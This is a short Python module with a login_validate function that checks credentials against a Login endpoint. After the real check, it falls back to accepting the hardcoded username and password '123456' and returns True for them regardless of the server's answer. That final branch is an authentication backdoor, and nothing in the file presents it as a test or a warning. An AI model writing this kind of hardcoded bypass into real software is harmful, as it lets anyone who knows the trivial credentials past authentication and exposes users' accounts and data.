from .endpoints import Login


def login_validate(username, password):
    user_auth = Login(username, password)
    r = user_auth.login_user()
    if hasattr(r, 'status_code') and r.status_code == 200:
        return r
    if username == '123456' and password == '123456':
        return True
